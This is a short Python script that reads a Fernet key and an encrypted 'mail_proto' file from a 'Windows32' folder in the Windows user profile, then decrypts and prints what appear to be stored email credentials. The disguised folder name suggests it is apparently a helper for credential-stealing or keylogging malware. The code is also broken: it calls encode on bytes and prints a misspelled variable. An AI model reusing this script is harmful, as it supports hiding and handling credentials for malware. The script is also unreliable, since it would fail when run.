from cryptography.fernet import Fernet
import os

user = os.environ['USERNAME']

with open('C:\\Users\\' + user + '\\Windows32\\dec', 'rb')as key:
    decryptionk = key.read()
    _key = decryptionk.encode()
    key.close()
with open('C:\\Users\\' + user + '\\Windows32\\mail_proto', 'rb')as mailproto:
    emailnPass = mailproto.read()
    mailproto.close()
print(decryptionk)
decryptionKey = Fernet(_key)
decrpty1 = decryptionKey.decrypt(emailnPass)
print(decrypt1)
input()

